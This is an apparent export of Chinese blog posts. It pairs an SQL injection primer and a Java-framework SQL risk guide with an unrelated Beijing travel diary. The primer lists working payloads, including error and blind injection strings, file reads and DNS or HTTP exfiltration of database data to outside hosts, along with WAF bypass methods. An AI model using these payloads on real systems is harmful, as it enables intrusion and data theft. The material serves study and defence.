[{"categories":["网络安全"],"content":"一、原理 ​ 用户传入的参数使用拼接的方式请求数据库，攻击者通过闭合方式控制数据库查询想要的结果 ","date":"2024-05-28","objectID":"/posts/sql-injection-macro/:1:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - 安全宏观101","uri":"/posts/sql-injection-macro/"},{"categories":["网络安全"],"content":"二、危害 数据泄露 RCE 通过into outfile、dumpfile(用于二进制文件)写webshell(有secure_file_priv限制) 通过开启general_log日志的方式写webshell(没有secure_file_priv限制) 读文件 1 union select 1,2,load data local infile(‘D://test.txt’)–+ 1 union select 1,2,load_file(‘D://test.txt’)–+ 文件写入 select .. into outfile SSRF 调用请求url函数 windows系统下可以利用unc发起网络请求，结合responder可以获取到连接者的Net-NTLM hash ","date":"2024-05-28","objectID":"/posts/sql-injection-macro/:2:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - 安全宏观101","uri":"/posts/sql-injection-macro/"},{"categories":["网络安全"],"content":"三、类型 判断注入点 有回显 联合查询 union select，合并结果 爆出显示位 select sum(username) from user group by id union select username from user 报错注入 利用报错信息得到查询的结果 floor()，取整、updatexml()和extractvalue()，xpath语法错误。exp()，GeometryCollection()，polygon()，multipoint()，multilinestring()，linestring()，multipolygon() select username from user where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))) 无回显（盲注） 布尔 基于逻辑判断的真和假(比如通过substr、mid函数截取字符串) select username from user where id=1 and ascii(substr(database(),1,1))=106 延迟 sleep：睡眠时间 select username from user where id=200 or if(length(database())=11,sleep(1),1) benchmark：消耗计算资源产生延时效果 笛卡儿积：消耗计算资源产生延时效果 get_lock：开两个session，并使用get_lock函数加锁，观察延时的时间 dnslog注入（利用dnslog注入来提高盲注的效率，时间盲注和布尔盲注，效率慢，适用于数据量小的时候，数据量大容易跑挂网站） 原理：DNS查询时会产生DNS日志，我们可以在DNS日志中获取数据。 mysql 没有secure_file_priv的限制，用于联合注入或堆叠注入 mysql下的dnslog注入，利用的是windows的unc，所以linux系统无法成功，查询的数据中有特殊符号时，可使用 hex() 函数外带 id=1 and load_file(concat('\\\\\\\\',hex((select database())),'.xxx.ceye.io\\\\abc'))--+ oracle oracle数据库有内置方法可以发送dns请求，不受操作系统的影响。 UTL_HTTP.REQUEST、DBMS_LDAP.INIT、HTTPURITYPE select x from x where id=1 and utl_http.request('http://192.168.5.28:2019/'||(select banner from sys.v_$version where rownum=1))=1-- mssql、postgreSQL 仅适用堆叠注入 特殊的 堆叠（只有数据库和数据库函数支持执行多条sql语句时才行） select * from user; insert into user (username,password) value ('test','123') 二次注入 注册一个名叫 admin’# 的用户 执行修改密码：update users set password=’$new_pass’ where username=’$user’ and password=’$old_pass’; 带入用户名后的SQL是：update users set password=’$new_pass’ where username=’admin'# and password=’$old_pass’; 内联注入 内联查询（Inline Queries）SELECT statemnt FROM (SELECT statement); FROM后面跟着的部分是一个 SELECT查询子句，这个子句产生的结果会保存在 内联视图（Inline View）中。视图和表的结构一样但没有实际存储的数据，它建立在其他的表或者视图上 内联查询通常用于和其它方法结合使用，如在报错注入中就很常用到内联查询： id=1' AND (SELECT 7430 FROM(SELECT COUNT(*),CONCAT(0x7178787071,(SELECT (ELT(7430=7430,1))),0x716a6b7a71,FLOOR(RAND(0)*2))x FROM ","date":"2024-05-28","objectID":"/posts/sql-injection-macro/:3:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - 安全宏观101","uri":"/posts/sql-injection-macro/"},{"categories":["网络安全"],"content":"四、易发场景 产生漏洞的本质原因是什么 未对用户输入进行充分的验证和过滤，导致恶意用户在输入中嵌入了操纵数据库的恶意代码 研发在什么情况易写出这类问题 XFF（X-Forwarded-For）是header请求头中的一个参数是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。代表了HTTP的请求端真实的IP。服务器端会对XFF信息进行记录，但没有进行过滤处理，就容易导致sql注入的产生 // 浏览器IP，第一个代理服务器，第二个三个四个等等 X-Forwarded-For: client1, proxy1, proxy2, proxy3 // 注入 X-Forwarded-for: 127.0.0.1' and 1=1# // 服务器判断真实地址的参数有时不一定是XFF，可能是以下几个参数 x-forwarded-fot x-remote-IP x-originating-IP x-remote-ip x-remote-addr x-client-IP x-client-ip x-Real-ip 取数服务（报表平台），允许SQL片段传入 解决方法：改造，不信任任何参数，抽象好方法，提供给上游 字段名、表名，无法预编译 字段名：Order by（排序）、 GROUP BY（分组计算）、SELECT、 ON、 HAVING（GROUP BY分组结果的条件筛选） 表名： FROM、 JOIN ","date":"2024-05-28","objectID":"/posts/sql-injection-macro/:4:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - 安全宏观101","uri":"/posts/sql-injection-macro/"},{"categories":["网络安全"],"content":"五、发现方法 黑盒扫描器 数据采集模块 被动（与burp联动被动获取流量） 主动（主动爬取数据获取流量） 指定（指定url或数据包） 安全测试模块 现成工具：引入SQLMapApi 手动开发（参考sqlmap） 链接测试：是否能正常访问，页面相似度是否为动态的（每次访问页面的元素变化） 动态：寻找动态内容标记出来，方便后面对比时移除 注入检测： 启发式检测，让web报错回显快速识别dbms 发送 \" ' ) ( , . 随机组合（满足单双引号只有一个），看看是否有转型错误报错 布尔盲注： 发送逻辑真，相似 发送逻辑假，不相似 报错注入： 发送flag，正则匹配回显内容验证 时间盲注 计算正常访问时间，加上延时的时间，是否在期望时间范围内 联合查询 猜解列数，利用与模版页面比较的内容相似度寻找最最不同的那一个请求。 白盒扫描器 orm框架数据流，如checkmarx检查mybatis注入，无法找到sink 检测xml文件是否是mybatis的定义文件 检测所有的sql节点，并递归（sql节点中可能也有sql节点）将sql节点的内容存到字典中，得到SQL 正则匹配SQL中的${的内容，如果有匹配，记下其节点id 通过FindByMemberAccess(namespace + ‘.’+ id)，直接找到方法使用（而不是interface，因为mybatis的解析xml引号莫名其妙转成实体编码），也不考虑参数位置（因为变量名没法对应） 将找到的参数作为sink点，之后走正常的数据流构建即可。 Source点到Sink点的执行路径是可达的，而且执行过程中没有经过有效的Sanitize 除了逻辑漏洞外，其他均可归类为sink点可定义的安全漏洞 灰盒扫描器 会在SQL执行函数上面插入桩代码 业务线程Hook到用户请求，Hook到SQL执行函数，放在ThreadLocal变量中 当HTTP请求结束读取ThreadLocal请求信息和Hook信息，发给扫描器 扫描器会修改请求，插入单引号和flag并发送，单引号和flag达了桩代码，说明存在安全问题（没有Sanitize） 监控 监控SQL日志平台，平台SQL日志出现的引号为单数时存在SQL注入 ","date":"2024-05-28","objectID":"/posts/sql-injection-macro/:5:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - 安全宏观101","uri":"/posts/sql-injection-macro/"},{"categories":["网络安全"],"content":"六、修复方案 黑：流量侧怎么管控 waf：存在SQL特征的数据包、存在注入语句如（参考Druid） 系统级表information_schema.columns 系统级变量@@version 系统函数load_file等语句 SQL注释 sig3：使数据包无法篡改 白：逐渐降级方案： 预编译： where value 值、limit offset 和 total 值、insert value 值、update value 值 枚举校验： 排序方式、表名、列名、函数(例如 SUM，COUNT，MAX 等) 白名单校验： 表名、列名 表名、单列名： ^[a-zA-Z0-9-_.*]+$ 大小写字母、数字、减号、下划线、点、星号 多列名：上述加逗号 特殊字符转义：' \" , ; ( ) | # / \\ \u0026 = + \u003c \u003e ! \\0 转义 ‘ “ \\0 再在首尾添加单引号 ，确保拼接进的是字符串 灰：rasp 通过 raw sql 获取这些 gap 的长度，gap长度将用于协助判断parsed sql结构是否发生变化 如果 raw sql 与 parsed sql 的 gap 数量或内容不一致，则认为SQL发生变化。 ","date":"2024-05-28","objectID":"/posts/sql-injection-macro/:6:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - 安全宏观101","uri":"/posts/sql-injection-macro/"},{"categories":["网络安全"],"content":"七、绕过方法 从架构层面： 找到服务器真实IP，同网段绕过、http和https同时开放服务绕过、边缘资产漏洞利用绕过。 从协议层面： 分块传输 Transfer-Encoding为chunked，表示将用chunked编码传输内容，将数据包分成多个块 延时分块传输 目前很多WAF都已经支持WAF分块传输检测 WAF一般通过以下步骤检测分块传输内容: 发现数据包是分块传输，启动分块传输线程进行接收 分块传输线程不断接收客户端传来的分块，直到接收到0\\r\\n\\r\\n 将所有分块合并，并检测合并之后的内容 chunked-coding-converter 插件实现了在上一块传输完成后，sleep一段时间，再发送下一块。 目的是延长WAF分块传输线程的等待时间，从而消耗WAF性能。 注意：块与块之间发送的间隔时间必须要小于后端中间件的post timeout,Tomcat默认是20s,weblogic是30s。 利用pipline绕过 当发送内容超过一个 http 包容量时，需要分多次发送，Connection值会变成 keep-alive（即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束 Connection 为 close 为止） 用 burpsuite 抓包提交，复制整个包信息放在第一个包最后，把第一个包 close 改成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉。 有的waf不检测第一个包，只检测第二个包。 利用协议未覆盖绕过 在 http 头里的 Content-Type 提交表单支持四种协议： application/x-www-form-urlencoded -编码模式、multipart/form-data -文件上传模式、text/plain -文本模式、application/json -json模式 文件头的属性是传输前对提交的数据进行编码发送到服务器。其中 multipart/form-data 表示该数据被编码为一条消息,页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。 POST及GET提交绕过。 从规则层面： 编码绕过 char、hex 等价符号替换绕过 普通注释和内敛注释 mysql黑魔法 select{x user}from{x mysql.user} 参数污染等。 宽字节注入 ?id=1%df’ and 1=1–+ 单引号会被转义 ?id=1%df' and 1=1–+（\\的十六进制为%5c） %df%5c’ 认成 縗’（mysql使用GBK时。GBK编码特性：两个字符的前一个字符ASCII码大于128时，会将两个字符认成一个汉字） 资源限制角度绕过WAF 超大数据包绕过 这是众所周知、而又难以解决的问题。如果HTTP请求POST BODY太大，检测所有的内容，WAF集群消耗太大的CPU、内存资源。因此许多WAF只检测前面的几K字节、1M、或2M。对于攻击者而然，只需要在POST BODY前面添加许多无用数据，把攻击payload放在最后即可绕过WAF检测。 并发绕过 ","date":"2024-05-28","objectID":"/posts/sql-injection-macro/:7:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - 安全宏观101","uri":"/posts/sql-injection-macro/"},{"categories":["网络安全"],"content":"八、怎么治理 体系化治理方案是啥 编码：ide插件 Merge：新增代码监控 构建：白盒扫描 测试：iast、人工评估 生产：waf、SQL日志监控binlog ","date":"2024-05-28","objectID":"/posts/sql-injection-macro/:8:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - 安全宏观101","uri":"/posts/sql-injection-macro/"},{"categories":["网络安全"],"content":"九、常见问题 预编译原理 预编译将一次查询通过两次交互完成 第一次交互发送查询语句的模板，由后端的SQL引擎进行解析为AST或Opcode 第二次交互发送数据，代入AST或Opcode中执行，无论后续向模板传入什么参数，这些参数仅仅被当成字符串进行查询处理，因此杜绝了sql注入的产生。 DBMS识别 字符串连接符 mysql：page.php?id=’ ‘mysql’ — Oracle：page.jsp?id=’||’oracle’ — 版本查询 mysql：product.php?id=’ UNION SELECT @@version — Oracle：page.jsp?id=’UNION SELECT 1 FROM v$version — sql server：page.asp?id=sql’; SELECT @@SERVERNAME — 报错 待补充… ","date":"2024-05-28","objectID":"/posts/sql-injection-macro/:9:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - 安全宏观101","uri":"/posts/sql-injection-macro/"},{"categories":["生活旅行"],"content":"一、北京地下城 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:1:0","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"1、地点 二环里，西打磨厂街（据附近居民说，很多家院子里有入口，但都堵上了），新开放地点定位北京地下城 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:1:1","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"2、背景 因当时中国与苏联闹的僵硬中苏交恶，为了防范核战争，开始建设人防工事（防空洞），始建于1969年，30万本地居民齐上阵，不借助任何机械挖掘，历时10年完工，1980开始人防工作重点转为平战结合并对外开放（上世纪80年代），这座地下城中设有医院、商品部、电影院、理发室、旅馆、学校、食堂、滑冰场、粮仓。四通八达可以通往行政中心（故宫、天安门、火车站等），现如今已经开始施工改造，准备重新对外开放。地下城距离地面8米，最深可达十几米，宽2米，全长30公里，可容纳30余万人 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:1:2","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"3、游览 崇文门地铁站下车，正午太阳在头上，影子缩成了一团 img 来到西打磨厂街，路过一线天的小路，找传说中的地下城 img 没找到入口，只能在正门看看了 img ","date":"2024-05-26","objectID":"/posts/beijing20240526/:1:3","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"4、感受 生活需要探险，给自己带来惊喜，生活才不会无聊 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:1:4","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"二、中央文物管理中心 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:2:0","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"1、地点 北京市东城区西兴隆街1号，地方很好找，需要提前1天预约 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:2:1","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"2、背景 中央文物管理中心是国家领导人外交活动中相互赠礼的礼品展览 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:2:2","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"3、游览 门口大方气派（政府楼风格） img 预约后，小门检票进入。大厅很大，没有照相，直接看展品，“万寿无疆”（形状有点像…欲言又止）真会送。 img 1973法国总统蓬皮杜应邀访华赠《亚马逊河》挂毯 地毯挂墙上？ img 随手一拍，右上角照片是达尔文 img 邓小平应邀访问泰国，赠邓的《运木大象》大象代表吉祥（精神力量的象征，也代表着至高的力量和智慧） 不过看着运输的方式并不太聪明，只显得一身蛮力 img 1978年8月，中国和日本签署和平友好条约，同年10月，邓小平应邀访问日本，日本国会赠邓小平《博多舞扇人偶》 保守版不知火舞手办 img 随手拍（大刀、盒子、杯子） img 左1，影视剧的影响我以为水晶很贵，但实际上比钻石差很大，左2，真的好看，非常有品位啦 img 阿联酋赠的金孔雀，金丝做的，非常昂贵。 img 随手拍（碗、蜜蜡、瓶子） img 非洲送的 img 美国赠的，橄榄球、球衣 img 布基纳法索（非洲国家）总统送习的猴面包树 想起了《小王子》 img 这个厉害啊 img 沙特阿拉伯赠习的延布炼厂纪念摆件 这么耀眼，8成是金 img 牛哇 img 不愧是好哥们。习敢用吗 img img G20 img 据说这是火山石，能飘在水上 img 连古董都赠了 img 非洲国家很爱送猴面包树呀 img 克罗地亚，赠送 彭卡拉（Penkala） 自动铅 彭卡拉公司发明了自动铅笔 img 随手拍 img 《碧玉扁棍》代表权力的象征。生活中的毛利人扁棍是用骨头和石头做的。 有点像LOL的巨魔之王武器 img 澳大利亚特有的鸭嘴兽 img 3楼休息厅 img ","date":"2024-05-26","objectID":"/posts/beijing20240526/:2:3","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"4、感受 我们送了啥？很多景泰蓝瓶瓶罐罐、丝绸 不太感兴趣就没有拍。 国家之间送礼实际大多数并没多么贵重，瓶瓶罐罐、手办、木雕、就是我们常见的文创。能代表国家文化、国家特产，送什么都很好。 人们相互送礼考虑的方面有很多，对方喜不喜欢、是否实用、有没有啥寓意，如果从外地回来还要准备特产（特产、伴手礼、礼遇），这样久了会觉得很累，我想最好的状态是对礼物不计较别人有我也要有，不相互内耗 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:2:4","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"三、天安门广场 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:3:0","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"1、地点： 天安门广场 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:3:1","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"2、背景 天安门广场不知道从什么时候开始需要提前预约了，提前一天预约 故宫、天安门、紫禁城，之间的关系 故宫：旧称紫禁城，意思是旧时的皇宫 天安门：北京皇城的城门，皇城四门分别是天安门、地安门、东安门、西安门 紫禁城：紫色在古代是稀有颜色，也皇帝的专属颜色。禁止普通民众进入皇帝居住的地方，所以才被称为紫禁城 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:3:2","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"3、游览 去天安门路上路过前门，推荐三里河公园（在前门里），真的漂亮 img 前门 img 到了，但没预约不让进，在旁边照个相吧，19:11，照完后坐车回家 img ","date":"2024-05-26","objectID":"/posts/beijing20240526/:3:3","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["生活旅行"],"content":"4、感受 陈述事实： 整体明显没以前包容了，明明里面人不多，还要提前1天预约，大多数人不知道，也都进不去 路人向保安小哥问路，其态度特不耐烦，需要提高素质啊 ","date":"2024-05-26","objectID":"/posts/beijing20240526/:3:4","tags":["北京","旅行"],"title":"旅游 - 北京（地下城、中央文物管理中心、天安门）20240526","uri":"/posts/beijing20240526/"},{"categories":["网络安全"],"content":"一、常用数据库开发体系 ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:1:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"1、框架 ORM（Object-Relational Mapping）框架是一种用于将对象模型和关系型数据库之间的数据映射的工具。它可以自动跟踪对象的变化，将对象的状态同步到数据库中，并自动执行CRUD操作（Create、Read、Update、Delete）。 名称 ORM框架？ 说明 Spring JDBC 否 Spring框架提供的JDBC抽象层，简化了数据库操作 Spring Data JPA 是 减少为各种持久层存储实现数据访问层所需的代码量 Hibernate 是 提供了对象关系映射(ORM)框架，简化了数据库操作 Mybatis 是 一个优秀的持久层框架,支持定制化 SQL、存储过程和高级映射。 JOOQ 是 基于 SQL 的数据库映射框架,将数据库表映射为 Java 对象,同时提供了类型安全的 SQL 构建器 ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:1:1","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"2、数据库 名称 关系型？ 说明 MySQL 是 被广泛使用于Web应用开发中，由Oracle公司管理。 ClickHouse 是 ClickHouse是一个用于数据分析的列式数据库系统，具有高性能和高可扩展性，且支持实时查询。它是由俄罗斯的Yandex公司开发和维护，支持SQL语言。 MariaDB 是 MariaDB是一个由MySQL的叉子演化而来的关系型数据库管理系统（RDBMS），它大部分代码和架构都来自MySQL，兼容MySQL，同时也提供了一些MySQL没有的特色功能，并具有高可扩展性、高性能和高安全性等特点。 Hive 是 Hive是由Apache Hadoop创建的数据仓库工具，使用类似SQL的HiveQL查询语言用于查询、分析和管理大数据。Hive基于Hadoop Distributed File System（HDFS），它使用HiveQL构建数据仓库并将SQL查询转换为MapReduce任务运行。 PostgreSQL 是 具有高度的可靠性、可扩展性和数据完整性。 MongoDB 否 一种基于分布式文件存储的NoSQL数据库 Redis 否 一种高性能的内存数据结构存储，被广泛用于缓存和应用程序中间层。 Elasticsearch 否 一种分布式的全文搜索服务，能够快速地对大规模的数据集进行搜索和分析，并提供丰富的查询功能、聚合分析等特点。 ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:1:2","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"3、连接池 名称 说明 HikariCP HikariCP是一个轻量级的高性能Java数据库连接池，尤其适合高负载的应用场景，比其他连接池更快，并提供更好的性能，支持JDBC 3和JDBC 4标准，并提供非常容易的配置。 Druid Druid是Alibaba开源的一个高性能的数据库连接池，支持JDBC 4.1规范，具有监控、防御SQL注入等特性，容易集成Spring等框架。 ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:1:3","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"二、数据库框架调用风险 ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:2:0","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"1、JDBC JDBC（Java DataBase Connectivity）Java连接数据库操作的原生接口。可以用相同的操作方法去操作不同产商的DB。 img 调用方法 接口 描述 预编译 JDBC API Statement 简单的 SQL 语句执行方式，支持变量替换，安全性比较低 无 PreparedStatement 可以提前进行 SQL 编译，支持占位符传参，具有更好的可读性和安全性。 ?占位符 Spring JDBC JdbcTemplate 基于 JDBC 原生 API 进行封装，提供了更方便的 API，具有更好的可读性和安全性。 ?占位符 NamedParameterJdbcTemplate 在JdbcTemplate 的基础上，提供了通过命名参数的方式为占位符提供实际参数值的功能，从而使得 SQL 更加具有可读性和维护性。 命名参数: SimpleJdbcTemplate 对于 JdbcTemplate 和 NamedParameterJdbcTemplate 进行了进一步的简化和封装，使用更方便，但它在 Spring 3.x 后不再建议使用，已被废弃。 ?占位符、命名参数: JDBC API和Spring Jdbc调用不同之处 方式 Spring JDBC JDBC API 配置方式不同 数据库连接池的配置是通过配置文件来实现 显示加载并注册驱动程序，还需要手动指定与数据库的连接参数，这样代码耦合度较高。 连接池实现不同 Spring Boot内置的是HikariCP，也可以使用其他连接池实现 编写自己的连接池实现 处理异常方式不同 采用声明式事务处理的方式，即将相关的DAO方法用事务注解进行标记，当代码执行出错时，事务会自动回滚，不需要手动编写一些繁琐的JDBC异常处理代码 手动编写大量的异常处理代码，包括获取数据库连接异常、SQL语句执行异常等等，这样代码的可读性和可维护性都不够高。 调用方式不同 通过DAO层来调用SQLJdbcOperations、NamedParameterJdbcOperations、Spring Data JPA 手动编写 SQL 语句，并将 SQL 语句和 Java 数据对象进行映射，需要编写大量的转换和操作代码，从而导致代码的复杂和容易出错。 Spring Boot应用 img 纯JDBC package com.txw.jdbc; import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.sql.ResultSet; @SuppressWarnings(\"all\") // 注解警告信息public class JdbcTest01 { public static void main(String[] args) throws Exception { // 1.加载驱动 Class.forName(\"com.mysql.cj.jdbc.Driver\"); // 2 创建和数据库之间的连接 String username = \"testdb\"; String password = \"testxxxxxx\"; String url = \"jdbc:mysql://127.0.0.1:3306/test?useUnicode=true\u0026characterEncoding=UTF-8\u0026useSSL=false\u0026serverTimezone=Asia/Shanghai\"; Connection conn = DriverManager.getConnection(url,username,password); // 3.准备发送SQL String sql = \"select * from t_person\"; PreparedStatement pstm = conn.prepareStatement(sql); // 4.执行SQL，接收结果集 ResultSet rs = pstm.executeQuery(); // 5 处理结果集 while(rs.next()){ int personId1 = rs.getInt(\"person_id\"); String personName1 = rs.getString(\"person_name\"); int age1 = rs.getInt(\"age\"); String sex1 = rs.getString(\"sex\"); String mobile1 = rs.getString(\"mobile\"); String address1 = rs.getString(\"address\"); System.out.println(\"personId=\"+personId1+\",personName=\"+personName1+\",age=\"+age1+\",sex=\"+sex1+\",mobile=\"+mobile1+\",address=\"+address1); } // 6.释放资源 rs.close(); pstm.close(); conn.close(); }} （1）Statement 每次执行时都需要编译，增大系统开销 //注入 String sql = \"select * from user where username = '\" + username + \"'\"; Statement st = con.createStatement(); ResultSet rs = st.executeQuery(sql); //预编译 //无预编译，使用PreparedStatement代替Statement （2）PrepareStatement 会对 SQL 语句进行预编译，减小系统开销 //注入 String sql = \"select * from user where username = '\" + username + \"'\"; PreparedStatement ps = con.prepareStatement(sql); ResultSet rs = ps.executeQuery(); //预编译 String sql = \"select * from user where username = ?\"; PreparedStatement ps = con.prepareStatement(sql); ps.setString(1 ,username); ResultSet rs = ps.executeQuery(); （3）JdbcTemplate 参数传递方式基于顺序，即通过索引来传递参数 //注入 @RestController public class JdbcController { @Autowired private JdbcTemplate jdbcTemplate; @GetMapping(\"/users\") public List\u003cMap\u003cString,Object\u003e\u003e getUsers(String name) { String sql = \"SELECT * FROM user WHERE username = '\"+name+\"'\"; List\u003cMap\u003cString,Object\u003e\u003e userList= jdbcTemplate.queryForList(sql); return userList; } } //预编译 @RestController public class JdbcController { @Autowired private JdbcTemplate jdbcTemplate; @GetMapping(\"/users\") public List\u003cMap\u003cString,Object\u003e\u003e getUsers(String name) { String sql = \"SELECT * FROM user WHERE username = ?\"; Object[] obj = new Object[] {name}; List\u003cMap\u003cString,Object\u003e\u003e userList= jdbcTemplate.queryForList(sql, obj); return userList; } } 使用List最后转成Array @RestController public class JdbcController { @Autowired private JdbcTemplate jdbcTemplate; @GetMapping(\"/users\") public List\u003cMap\u003cString,Object\u003e\u003e getUsers(String name) { String sql = \"SELECT * FROM user WHERE username = ?\"; List\u003cObject\u003e params = new ArrayList\u003cObject\u003e(); params.add(name); List\u003cMap\u003cString,Object\u003e\u003e userList= jdbcTemplate.queryForList(sql, params.toArray()); return userList; } } （4）NamedParameterJdbcTemplate 参数传递方式基于名称，即通过参数名来传递参数 //注入 @RestContro","date":"2024-04-13","objectID":"/posts/sql-injection-code/:2:1","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"2、Hibernate @Entity public class User { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; private String name; private Integer age; // 省略 getter 和 setter 方法 } entityManager查询SQL @Repository public class UserDao { @Autowired private EntityManager entityManager; public User findById(Long id) { String hql = \"from User where id = :id\"; TypedQuery\u003cUser\u003e query = entityManager.createQuery(hql, User.class); query.setParameter(\"id\", id); return query.getSingleResult(); } public List\u003cUser\u003e findAll() { String hql = \"from User\"; TypedQuery\u003cUser\u003e query = entityManager.createQuery(hql, User.class); return query.getResultList(); } public Page\u003cUser\u003e findPage(int pageNo, int pageSize, String sortField, boolean ascending) { String hql = \"select u from User u order by u.\" + sortField + (ascending ? \" asc\" : \" desc\"); TypedQuery\u003cUser\u003e query = entityManager.createQuery(hql, User.class); query.setFirstResult((pageNo - 1) * pageSize); query.setMaxResults(pageSize); List\u003cUser\u003e resultList = query.getResultList(); long totalCount = count(); return new PageImpl\u003c\u003e(resultList, PageRequest.of(pageNo - 1, pageSize), totalCount); } public long count() { String hql = \"select count(*) from User\"; TypedQuery\u003cLong\u003e query = entityManager.createQuery(hql, Long.class); return query.getSingleResult(); } } controller @RestController @RequestMapping(\"/users\") public class UserController { @Autowired private UserDao userDao; @GetMapping(\"/{id}\") public User findById(@PathVariable Long id) { return userDao.findById(id); } @GetMapping public List\u003cUser\u003e findAll() { return userDao.findAll(); } @GetMapping(\"/page\") public Page\u003cUser\u003e findPage(@RequestParam int pageNo, @RequestParam int pageSize, @RequestParam String sortField, @RequestParam boolean ascending) { return userDao.findPage(pageNo, pageSize, sortField, ascending); } } （1）createQuery createQuery是HQL\u0026JPQL查询方法。HQL注入在漏洞利用上有一定的限制，比如不能利用联合查询、不能跨库查表、执行命令等。 @Autowired private EntityManager entityManager; public User findById(String id) { String hql = \"from User where id = \" + id; //User表名 TypedQuery\u003cUser\u003e query = entityManager.createQuery(hql, User.class); return query.getSingleResult(); } （2）createNativeQuery 是SQL查询方法 @Autowired private EntityManager entityManager; public Object findById(String id) { String hql = \"select * from user where id = \" + id; //User表名 Query query = entityManager.createNativeQuery(hql, User.class); return query.getSingleResult(); } ","date":"2024-04-13","objectID":"/posts/sql-injection-code/:2:2","tags":["SQL注入","漏洞研究"],"title":"SQL注入 - Java栈SQL框架风险","uri":"/posts/sql-injection-code/"},{"categories":["网络安全"],"content":"3、Spring Data JPA JPA 即Java Persistence API的缩写，也即JAVA持久化层API，涵盖几个方面： 一套标准API：在javax.persistence的包下面提供，用来操作实体对象，执行CRUD操作，将开发者从烦琐的JDBC和SQL代码中解脱出来，按照JAVA思路去编写代码操作DB。 面向对象操作语言：通过面向对象的思路，避免代码与SQL的深度耦合。 ORM元数据映射：ORM，即Object Relation Mapping，对象关系映射。 Spring Data JPA整体实现逻辑 Spring Data JPA不是一个完整JPA规范的实现，它只是一个代码抽象层，主要用于减少为各种持久层存储实现数据访问层所需的代码量。其底层依旧是Hibernate。可以把Spring Data JPA理解为JPA规范的再次封装抽象。JAVA业务层调用SpringData JPA二次封装提供的Repository层接口，进而基于JPA标准API进行处理，基于Hibernate提供的JPA具体实现，接着基于JDBC标准API接口，完成与实际DB之间的请求交互 img 名称 说明 